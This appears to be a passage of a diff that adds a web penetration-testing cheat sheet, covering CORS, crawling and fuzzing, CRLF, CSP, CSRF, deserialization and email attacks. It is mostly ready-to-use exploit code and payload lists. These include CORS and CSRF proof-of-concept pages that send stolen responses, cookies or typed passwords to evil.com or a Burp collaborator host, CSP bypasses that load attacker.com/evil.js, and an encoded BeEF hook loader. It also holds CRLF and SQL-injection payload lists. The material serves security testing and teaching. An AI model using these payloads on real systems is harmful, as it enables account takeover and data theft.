+}
+
+fetchUrl("http://$ip");
+</script>
+Click on "Deliver exploit to victim" to submit the code. Once you have submitted the form to delete user carlos then you have completed the lab.
+
+# JSONP
+
+In GET URL append “?callback=testjsonp”
+Response should be:
+testjsonp(<json-data>)
+
+# Bypasses
+Origin:null
+Origin:attacker.com
+Origin:attacker.target.com
+Origin:attackertarget.com
+Origin:sub.attackertarget.com
+```
+
+## **CORS PoC**
+
+```
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS PoC Exploit</title>
+</head>
+<body>
+<center>
+
+<h1>CORS Exploit<br>six2dez</h1>
+<hr>
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+<script type="text/javascript">
+ function cors() {
+   var xhttp = new XMLHttpRequest();
+   xhttp.onreadystatechange = function() {
+     if(this.readyState == 4 && this.status == 200) {
+        document.getElementById("demo").innerHTML = this.responseText;
+     }
+   };
+ xhttp.open("GET", "http://<vulnerable-url>", true);
+ xhttp.withCredentials = true;
+ xhttp.send();
+ }
+</script>
+
+</center>
+</body>
+</html>
+```
+
+## **CORS PoC 2**
+
+```
+<html>
+<script>
+var http = new XMLHttpRequest();
+var url = 'Url';//Paste here Url
+var params = 'PostData';//Paste here POST data
+http.open('POST', url, true);
+
+//Send the proper header information along with the request
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+
+http.onreadystatechange = function() {//Call a function when the state changes.
+    if(http.readyState == 4 && http.status == 200) {
+        alert(http.responseText);
+    }
+}
+http.send(params);
+
+</script>
+</html>
+```
+
+## CORS PoC 3 - Sensitive Data Leakage
+
+```
+<html>
+<body>
+<button type='button' onclick='cors()'>CORS</button>
+<p id='corspoc'></p>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+var a = this.responseText; // Sensitive data from target1337.com about user account
+document.getElementById("corspoc").innerHTML = a;
+xhttp.open("POST", "https://evil.com", true);// Sending that data to Attacker's website
+xhttp.withCredentials = true;
+console.log(a);
+xhttp.send("data="+a);
+}
+};
+xhttp.open("POST", "https://target1337.com", true);
+xhttp.withCredentials = true;
+var body = "requestcontent";
+var aBody = new Uint8Array(body.length);
+for (var i = 0; i < aBody.length; i++)
+aBody[i] = body.charCodeAt(i); 
+xhttp.send(new Blob([aBody]));
+}
+</script>
+</body>
+</html>
+```
+
+## **CORS JSON PoC**
+
+```
+<!DOCTYPE html>
+<html>
+<head>
+<title>JSONP PoC</title>
+</head>
+<body>
+<center>
+
+<h1>JSONP Exploit<br>YourTitle</h1>
+<hr>
+<div id="demo">
+<button type="button" onclick="trigger()">Exploit</button>
+</div>
+<script>
+
+function testjsonp(myObj) {
+  var result = JSON.stringify(myObj)
+  document.getElementById("demo").innerHTML = result;
+  //console.log(myObj)
+}
+
+</script>
+
+<script >
+
+  function trigger() {
+    var s = document.createElement("script");
+    s.src = "https://<vulnerable-endpoint>?callback=testjsonp";
+    document.body.appendChild(s);
+}
+
+</script>
+</body>
+</html>
+```
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/crawl-fuzz.md
+# Crawl/Fuzz
+
+```bash
+# Crawlers
+dirhunt https://url.com/
+hakrawler -domain https://url.com/
+python3 sourcewolf.py -h
+gospider -s "https://example.com/" -o output -c 10 -d 1
+gospider -S sites.txt -o output -c 10 -d 1
+gospider -s "https://example.com/" -o output -c 10 -d 1 --other-source --include-subs
+
+# Fuzzers
+# ffuf
+# Discover content
+ffuf -recursion -mc all -ac -c -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml -w six2dez/OneListForAll/onelistforall.txt -u https://url.com/FUZZ
+# Headers discover
+ffuf -mc all -ac -u https://hackxor.net -w six2dez/OneListForAll/onelistforall.txt -c -H "FUZZ: Hellothereheadertesting123 asd"
+# Ffuf - burp
+ffuf -replay-proxy http:127.0.0.1:8080
+# Fuzzing extensions
+# General
+.htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml,.inc
+# Backups
+'.bak','.bac','.old','.000','.~','.01','._bak','.001','.inc','.Xxx'
+
+# kr
+# https://github.com/assetnote/kiterunner
+kr brute https://whatever.com/ -w onelistforallmicro.txt -x 100 --fail-status-codes 404
+kr scan https://whatever.com/ -w routes-small.kite -A=apiroutes-210228 -x 100 --ignore-length=34
+
+# chameleon
+# https://github.com/iustin24/chameleon
+./chameleon -u http://testphp.vulnweb.com -a -A
+
+# Best wordlists for fuzzing:
+# https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
+    - raft-large-directories-lowercase.txt
+    - directory-list-2.3-medium.txt
+    - RobotsDisallowed/top10000.txt 
+# https://github.com/assetnote/commonspeak2-wordlists/tree/master/wordswithext    - 
+# https://github.com/random-robbie/bruteforce-lists
+# https://github.com/google/fuzzing/tree/master/dictionaries
+# https://github.com/six2dez/OneListForAll
+# AIO: https://github.com/foospidy/payloads
+# Check https://wordlists.assetnote.io/
+
+# Pro tip: set "Host: localhost" as header
+    
+# Custom generated dictionary
+gau example.com | unfurl -u paths
+# Get files only
+sed 's#/#\n#g' paths.txt |sort -u
+# Other things
+gau example.com | unfurl -u keys
+gau example.com | head -n 1000 |fff -s 200 -s 404
+
+# Hadrware devices admin panel
+# https://github.com/InfosecMatter/default-http-login-hunter
+default-http-login-hunter.sh https://10.10.0.1:443/
+
+# Dirsearch
+dirsearch -r -f -u https://10.11.1.111 --extensions=htm,html,asp,aspx,txt -w six2dez/OneListForAll/onelistforall.txt --request-by-hostname -t 40
+
+# dirb
+dirb http://10.11.1.111 -r -o dirb-10.11.1.111.txt
+
+# wfuzz
+wfuzz -c -z file,six2dez/OneListForAll/onelistforall.txt --hc 404 http://10.11.1.11/FUZZ
+
+# gobuster
+gobuster dir -u http://10.11.1.111 -w six2dez/OneListForAll/onelistforall.txt -s '200,204,301,302,307,403,500' -e
+
+# Cansina
+# https://github.com/deibit/cansina
+python3 cansina.py -u example.com -p PAYLOAD
+
+# Ger endpoints from JS
+# LinkFinder
+# https://github.com/GerbenJavado/LinkFinder
+python linkfinder.py -i https://example.com -d
+python linkfinder.py -i burpfile -b
+
+# JS enumeration
+# https://github.com/KathanP19/JSFScan.sh
+
+# Tip, if 429 add one of these headers:
+Client-Ip: IP
+X-Client-Ip: IP
+X-Forwarded-For: IP
+X-Forwarded-For: 127.0.0.1
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/crlf.md
+# CRLF
+
+## Tools
+
+```bash
+# https://github.com/MichaelStott/CRLF-Injection-Scanner
+crlf_scan.py -i <inputfile> -o <outputfile>
+# https://github.com/dwisiswant0/crlfuzz
+crlfuzz -u "http://target"
+# https://github.com/ryandamour/crlfmap
+crlfmap scan --domains domains.txt --output results.txt
+```
+
+```text
+The following simplified example uses CRLF to:
+
+1. Add a fake HTTP response header: Content-Length: 0. This causes the web browser to treat this as a terminated response and begin parsing a new response.
+2. Add a fake HTTP response: HTTP/1.1 200 OK. This begins the new response.
+3. Add another fake HTTP response header: Content-Type: text/html. This is needed for the web browser to properly parse the content.
+4. Add yet another fake HTTP response header: Content-Length: 25. This causes the web browser to only parse the next 25 bytes.
+5. Add page content with an XSS: <script>alert(1)</script>. This content has exactly 25 bytes.
+6. Because of the Content-Length header, the web browser ignores the original content that comes from the web server.
+
+    http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
+
+- Cloudflare CRLF bypass
+<iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”>
+
+Payload list:
+/%%0a0aSet-Cookie:crlf=injection
+/%0aSet-Cookie:crlf=injection
+/%0d%0aSet-Cookie:crlf=injection
+/%0dSet-Cookie:crlf=injection
+/%23%0aSet-Cookie:crlf=injection
+/%23%0d%0aSet-Cookie:crlf=injection
+/%23%0dSet-Cookie:crlf=injection
+/%25%30%61Set-Cookie:crlf=injection
+/%25%30aSet-Cookie:crlf=injection
+/%250aSet-Cookie:crlf=injection
+/%25250aSet-Cookie:crlf=injection
+/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
+/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
+/%2F..%0d%0aSet-Cookie:crlf=injection
+/%3f%0d%0aSet-Cookie:crlf=injection
+/%3f%0dSet-Cookie:crlf=injection
+/%u000aSet-Cookie:crlf=injection
+/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
+/%0d%0aheader:header
+/%0aheader:header
+/%0dheader:header
+/%23%0dheader:header
+/%3f%0dheader:header
+/%250aheader:header
+/%25250aheader:header
+/%%0a0aheader:header
+/%3f%0dheader:header
+/%23%0dheader:header
+/%25%30aheader:header
+/%25%30%61header:header
+/%u000aheader:header
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/csp.md
+# CSP
+
+```markup
+# CSP Checker
+https://csp-evaluator.withgoogle.com/
+
+# Content-Security-Policy Header
+
+- If upload from web is allowed or <img src="URL">:
+https://medium.com/@shahjerry33/pixel-that-steals-data-im-invisible-3c938d4c3888
+https://iplogger.org/invisible/
+https://iplogger.org/15bZ87
+
+- Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-inline' https://*; child-src 'none'; report-uri /Report-parsing-url;
+By observing this policy we can say it's damn vulnerable and will allow inline scripting as well . The reason behind that is the usage of unsafe-inline source as a value of script-src directive.
+working payload : "/><script>alert(1337);</script>
+
+- Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-eval' data: http://*; child-src 'none'; report-uri /Report-parsing-url;
+Again this is a misconfigured CSP policy due to usage of unsafe-eval.
+working payload : <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+
+- Content-Security-Policy: script-src 'self' https://facebook.com https://google.com https: data *; child-src 'none'; report-uri /Report-parsing-url;
+Again this is a misconfigured CSP policy due to usage of a wildcard in script-src.
+working payloads :"/>'><script src=https://attacker.com/evil.js></script>"/>'><script src=data:text/javascript,alert(1337)></script>
+
+- Content-Security-Policy: script-src 'self' report-uri /Report-parsing-url;
+Misconfigured CSP policy again! we can see object-src and default-src are missing here.
+working payloads :<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
+<param name="AllowScriptAccess" value="always"></object>
+
+- Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' ajax.googleapis.com;
+With unsafe-eval policy enabled we can perform a Client-Side Template Injection attack.
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script> <div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} </div>
+<script src=https://drive.google.com/uc?id=...&export=download></script>
+
+- Content-Security-Policy: default-src 'self'; script-src 'self'  *.googleusercontent.com *.google.com *.yandex.net;
+You can upload the payload to the Yandex.Disk storage, copy the download link and replace the content_type parameter value in the link with application/javascript
+<script src="https://[***].storage.yandex.net/[...]content_type=application/javascript&[***]"></script>
+
+- Content-Security-Policy: default-src 'self'
+If you are not allowed to connect to any external host, you can send data directly in the URL (query string) by redirecting the user to your web server
+window.location='https://deteact.com/'+document.cookie;
+
+- Content-Security-Policy: script-src 'self'; object-src 'none' ; report-uri /Report-parsing-url;
+We  can see object-src is set to none but yes this CSP can be bypassed too  to perform XSS. How ? If the application allows users to upload any type  of file to the host. An attacker can upload any malicious script and  call within any tag.
+working payloads :"/>'><script src="/user_upload/mypic.png.js"></script>
+
+- Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none' ; report-uri /Report-parsing-url;
+In such scenarios where script-src is set to self and a particular domain which is whitelisted, it can be bypassed using jsonp. jsonp endpoints allow insecure callback methods which allow an attacker to perform xss.
+working payload :"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+
+- Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/; object-src 'none' ; report-uri /Report-parsing-url;
+In  such scenarios where script-src is set to self and a javascript library  domain which is whitelisted. It can be bypassed using any vulnerable  version of javascript file from that library , which allows the attacker  to perform xss.
+working payloads :<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+ <div ng-app ng-csp>
+  {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
+ </div>"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
+<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
+
+- Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
+If  the application is using angular JS and scripts are loaded from a  whitelisted domain. It is possible to bypass this CSP policy by calling  callback functions and vulnerable class. For more details visit this  awesome git repo.
+working payloads :ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
+
+- Content-Security-Policy: script-src 'self' accounts.google.com/random/ website.with.redirect.com ; object-src 'none' ; report-uri /Report-parsing-url;
+In  the above scenario, there are two whitelisted domains from where  scripts can be loaded to the webpage. Now if one domain has any open  redirect endpoint CSP can be bypassed easily. The reason behind that is  an attacker can craft a payload using redirect domain targeting to other  whitelisted domains having a jsonp endpoint. And in this scenario XSS  will execute because while redirection browser only validated host, not  the path parameters.
+working payload :">'><script src="https://website.with.redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>">
+
+- Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' www.googletagmanager.com;
+With inline execution enabled we can simply injection our code into the page.
+url.com/asd.php/?a=<script>alert(document.domain)</scrtipt>
+GoogleTagManager
+<script>setTimeout(function(){dataLayer.push({event:'gtm.js'})},1000)</script>
+<script src="//www.googletagmanager.com/gtm.js?id=GTM-*******"></script>
+
+- Content-Security-Policy: default-src 'self' data: *; connect-src 'self'; script-src  'self' ;report-uri /_csp; upgrade-insecure-requests
+This CSP policy can be bypassed using iframes. The condition is that  application should allow iframes from the whitelisted domain. Now using a  special attribute srcdoc of iframe, XSS can be easily achieved.
+working payloads :<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>* sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
+
+- CSP with policy injection (only Chrome)
+/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/csrf.md
+# CSRF
+
+## Summary
+
+{% hint style="info" %}
+Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.
+
+3 conditions:
+
+* A relevant action.
+* Cookie-based session handling.
+* No unpredictable request parameters.
+
+How to find:
+
+* Remove CSRF token from requests and/or put a blank space.
+* Change POST to GET.
+* Replace the CSRF token with a random value (for example 1).
+* Replace the CSRF token with a random token of the same restraints.
+* Extract token with HTML injection.
+* Use a CSRF token that has been used before.
+* Bypass regex.
+* Remove referer header.
+* Request a CSRF by executing the call manually and use that token for the request.
+{% endhint %}
+
+### Approach
+
+```
+- Removing the token parameter entirely
+- Setting the token to a blank string
+- Changing the token to an invalid token of the same format
+- Using a different user's token
+- Put the parameters in the URL instead of POST body (and remove the token) and change the HTTP verb to GET
+- Testing every sensitive endpoint
+- Check whether the token might be guessed / cracked
+- Check whether new tokens are generated for every session, if not they may be a hash of something simple like the user's email address. If so you can craft your own valid tokens.
+- Try building the payload with multiple methods including a standard HTML form, multipart form, and XHR (Burp can help)
+```
+
+### Quick attacks
+
+```markup
+# HTML GET
+<a href=”http://vulnerable/endpoint?parameter=CSRFd">Click</a>
+
+# HTML GET (no interaction)
+<img src=”http://vulnerable/endpoint?parameter=CSRFd">
+
+# HTML POST:
+<form action="http://vulnerable/endpoint" method="POST">
+<input name="parameter" type="hidden" value="CSRFd" />
+<input type="submit" value="Submit Request" />
+</form>
+
+# HTML POST (no interaction)
+<form id="autosubmit" action="http://vulnerable/endpoint" method="POST">
+<input name="parameter" type="hidden" value="CSRFd" />
+<input type="submit" value="Submit Request" />
+</form>
+<script>
+document.getElementById("autosubmit").submit();
+</script>
+
+# JSON GET:
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://vulnerable/endpoint");
+xhr.send();
+</script>
+
+# JSON POST
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://vulnerable/endpoint");
+xhr.setRequestHeader("Content-Type", "text/plain");
+xhr.send('{"role":admin}');
+</script>
+```
+
+## Tools
+
+```bash
+# https://github.com/0xInfection/XSRFProbe
+xsrfprobe --help
+
+https://csrfshark.github.io/
+```
+
+## Example 1
+
+```markup
+Vulnerable request example:
+__
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
+
+email=wiener@normal-user.com
+__
+
+HTML with attack:
+__
+<html>
+  <body>
+    <form action="https://vulnerable-website.com/email/change" method="POST">
+      <input type="hidden" name="email" value="pwned@evil-user.net" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+__
+```
+
+## Example 2
+
+```markup
+# Exploit CSRF in GET:
+<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
+
+- SameSite cookie property avoid the attack:
+   → Only from same site:
+    SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict; 
+   → From other site only if GET and requested by click, not scripts (vulnerable if CSRF in GET or POST converted to GET):    
+    SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax; 
+
+<script>
+fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+## **Json CSRF**
+
+```
+Requirements:
+
+1. The authentication mechanism should be in the cookie-based model. (By default cookie-based authentication is vulnerable to CSRF attacks)
+2. The HTTP request should not be fortify by the custom random token on the header as well in the body.(X-Auth-Token)
+3. The HTTP request should not be fortify by the Same Origin Policy.
+
+Bypass 2 & 3:
+• Change the request method to GET append the body as query parameter.
+• Test the request without the Customized Token (X-Auth-Token) and also header.
+• Test the request with exact same length but different token.
+
+If post is not allowed, can try with URL/param?_method=PUT
+
+
+<body onload='document.forms[0].submit()'>
+<form action="https://<vulnerable-url>?_method=PUT" method="POST" enctype="text/plain">
+  <input type="text" name='{"username":"blob","dummy":"' value='"}'>
+  <input type="submit" value="send">
+</form>
+
+<!---This results in a request body of:
+{"username":"blob", "dummy": "="} -->
+```
+
+## **CSRF Token Bypass**
+
+```
+CSRF Tokens
+
+Unpredictable value generated from the server to the client, when a second request is made, server validate this token and reject the request if is missing or invalid. Prevent CSRF attack because the malicious HTTP request formed can't know the CSRF Token generated for the victim.
+   → Is transmited to the client through a hidden field:
+
+
+- Example:
+    __
+    POST /email/change HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 68
+    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+
+    csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&email=wiener@normal-user.com
+    __
+
+- Validation depends on method (usually POST):
+    __
+    GET /email/change?email=pwned@evil-user.net HTTP/1.1
+    Host: vulnerable-website.com
+    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+    __
+
+- Validation depend on token is present (if not, validation is skipped):
+    --
+    POST /email/change HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 25
+    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+
+    email=pwned@evil-user.net
+    --
+- CSRF not tied to user session
+
+- CSRF tied to a non-session cookie:
+    --
+    POST /email/change HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 68
+    Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
+
+    csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
+    --
+
+- CSRF token duplicated in cookie:
+    --
+    POST /email/change HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 68
+    Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
+
+    csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
+    --
+
+- Validation of referer depends on header present (if not, validation is skipped)
+
+- Circumvent referer validation (if only checks the domain existence)
+
+- Remove Anti-CSRF Token
+- Spoof Anti-CSRF Token by Changing a few bits
+- Using Same Anti-CSRF Token
+- Weak Cryptography to generate Anti-CSRF Token
+- Guessable Anti-CSRF Token
+- Stealing Token with other attacks such as XSS.
+- Converting POST Request to GET Request to bypass the CSRF Token Check. (This is what we will see for this article)
+
+Other validations bypasses:
+1) remove anticsrf tokens & parameter
+2) pass blank paramter
+3) add same length token
+4) add another userss valid anti csrf token
+5) random token in long length (aaaaaaaaa) 
+6) Try decode token
+7) Use only static part of the token
+```
+
+## CSRF sample POC
+
+```
+<html>
+<script>
+function jsonreq() {
+  var xmlhttp = new XMLHttpRequest();
+  xmlhttp.open("POST","https://target.com/api/endpoint", true);
+  xmlhttp.setRequestHeader("Content-Type","text/plain");
+  //xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+  xmlhttp.withCredentials = true;
+  xmlhttp.send(JSON.stringify({"test":"x"}));
+}
+jsonreq();
+</script>
+</html>
+```
+
+## CSRF to reflected XSS
+
+```
+<html>
+  <body>
+    <p>Please wait... ;)</p>
+    <script>
+let host = 'http://target.com'
+let beef_payload = '%3c%73%63%72%69%70%74%3e%20%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%3b%20%73%2e%74%79%70%65%3d%27%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%27%3b%20%73%2e%73%72%63%3d%27%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3b%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%27%68%65%61%64%27%29%5b%30%5d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%73%29%3b%20%3c%2f%73%63%72%69%70%74%3e'
+let alert_payload = '%3Cimg%2Fsrc%2Fonerror%3Dalert(1)%3E'
+
+function submitRequest() {
+  var req = new XMLHttpRequest();
+  req.open(<CSRF components, which can easily be copied from Burp's POC generator>);
+  req.setRequestHeader("Accept", "*\/*");
+  req.withCredentials = true;
+  req.onreadystatechange = function () {
+    if (req.readyState === 4) {
+      executeXSS();
+    }
+  }
+  req.send();
+}
+
+function executeXSS() {
+  window.location.assign(host+'<URI with XSS>'+alert_payload);
+}
+
+submitRequest();
+    </script>
+  </body>
+</html>
+```
+
+## Mindmaps
+
+![](https://camo.githubusercontent.com/1216587b905ccfe5114a4420caad3369e49d57c12d9c837a78330733540f9a12/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f4559373062786b576b4141467a47623f666f726d61743d6a7067266e616d653d39303078393030)
+
+![](<../../.gitbook/assets/image (51).png>)
+
+![](<../../.gitbook/assets/image (31).png>)
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/deserialization.md
+# Deserialization
+
+{% hint style="info" %}
+Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.
+
+Objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. An object of an unexpected class might cause an exception. By this time, however, the damage may already be done. Many deserialization-based attacks are completed before deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object.
+{% endhint %}
+
+## Vulnerable functions
+
+```
+# PHP
+unserialize()
+
+# Python
+pickle/c_pickle/_pickle with load/loads
+PyYAML with load
+jsonpickle with encode or store methods>/tmp/f
+
+# Java
+# Whitebox
+XMLdecoder with external user defined parameters
+XStream with fromXML method (xstream version <= v1.46 is vulnerable to the serialization issue)
+ObjectInputStream with readObject
+Uses of readObject, readObjectNodData, readResolve or readExternal
+ObjectInputStream.readUnshared
+Serializable
+# Blackbox
+AC ED 00 05 in Hex
+rO0 in Base64
+Content-type: application/x-java-serialized-object
+# ysoserial
+java -jar ysoserial.jar CommonsCollections4 'command'
+
+# .Net
+# Whithebox
+TypeNameHandling
+JavaScriptTypeResolver
+# Blackbox
+AAEAAAD/////
+TypeObject
+$type
+```
+
+## Tools
+
+```
+# Java
+# Ysoserial: https://github.com/frohoff/ysoserial
+java -jar ysoserial.jar CommonsCollections4 'command'
+# Java Deserialization Scanner: https://github.com/federicodotta/Java-Deserialization-Scanner
+# SerialKiller: https://github.com/ikkisoft/SerialKiller
+# Serianalyzer: https://github.com/mbechler/serianalyzer
+# Java Unmarshaller Security: https://github.com/mbechler/marshalsec
+# Java Serial Killer: https://github.com/NetSPI/JavaSerialKiller
+# Android Java Deserialization Vulnerability Tester: https://github.com/modzero/modjoda
+# Java https://github.com/phith0n/zkar
+
+# .NET
+# Ysoserial.net: https://github.com/pwntester/ysoserial.net
+ysoserial.exe -g ObjectDataProvider -f Json.Net -c “command-here” -o base64
+
+# Burp-Plugins
+# Java: https://github.com/DirectDefense/SuperSerial
+# Java: https://github.com/DirectDefense/SuperSerial-Active
+# Burp-ysoserial: https://github.com/summitt/burp-ysoserial
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/dns-rebinding.md
+# DNS rebinding
+
+### Services
+
+```
+https://sslip.io/
+https://lock.cmpxchg8b.com/rebinder.html
+```
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/email-attacks.md
+# Email attacks
+
+| Attack                   | Payload                                                                                                                                          |
+| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
+| XSS                      | <p>test+(alert(0))@example.com</p><p>test@example(alert(0)).com</p><p>"alert(0)"@example.com</p><p>&#x3C;script src=//xsshere?”@email.com</p>    |
+| Template injection       | <p>"&#x3C;%= 7 * 7 %>"@example.com</p><p> test+(${{7*7}})@example.com</p>                                                                        |
+| SQLi                     | <p>"' OR 1=1 -- '"@example.com </p><p>"mail'); SELECT version();--"@example.com</p><p>a'-IF(LENGTH(database())=9,SLEEP(7),0)or'1'='1\"@a.com</p> |
+| SSRF                     | <p>john.doe@abc123.burpcollaborator.net</p><p>john.doe@[127.0.0.1]</p>                                                                           |
+| Parameter Pollution      | victim\&email=attacker@example.com                                                                                                               |
+| (Email) Header Injection | <p>"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com</p><p>"recipient@test.com>\r\nRCPT TO:&#x3C;victim+"@test.com</p>                         |
+| Wildcard abuse           | %@example.com                                                                                                                                    |
+
+```
+# Bypass whitelist
+inti(;inti@inti.io;)@whitelisted.com
+inti@inti.io(@whitelisted.com)
+inti+(@whitelisted.com;)@inti.io
+
+#HTML Injection in Gmail
+inti.de.ceukelaire+(<b>bold<u>underline<s>strike<br/>newline<strong>strong<sup>sup<sub>sub)@gmail.com
+
+# Bypass strict validators
+# Login with SSO & integrations
+GitHub & Salesforce allow xss in email, create account and abuse with login integration
+
+# Common email accounts
+support@
+jira@
+print@
+feedback@
+asana@
+slack@
+hello@
+bug(s)@
+upload@
+service@
+it@
+test@
+help@
+tickets@
+tweet@
+```
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/general-info.md
+# General Info
+
+## Auth headers
+
+```bash
+# Basic Auth (B64)
+Authorization: Basic AXVubzpwQDU1dzByYM==
+# Bearer Token (JWT)
+Authorization: Bearer <token>
+# API Key
+GET /endpoint?api_key=abcdefgh123456789
+X-API-Key: abcdefgh123456789
+# Digest Auth
+Authorization: Digest username=”admin” Realm=”abcxyz” nonce=”474754847743646”, uri=”/uri” response=”7cffhfr54685gnnfgerg8”
+# OAuth2.0
+Authorization: Bearer hY_9.B5f-4.1BfE
+# Hawk Authentication
+Authorization: Hawk id="abcxyz123", ts="1592459563", nonce="gWqbkw", mac="vxBCccCutXGV30gwEDKu1NDXSeqwfq7Z0sg/HP1HjOU="
+# AWS signature
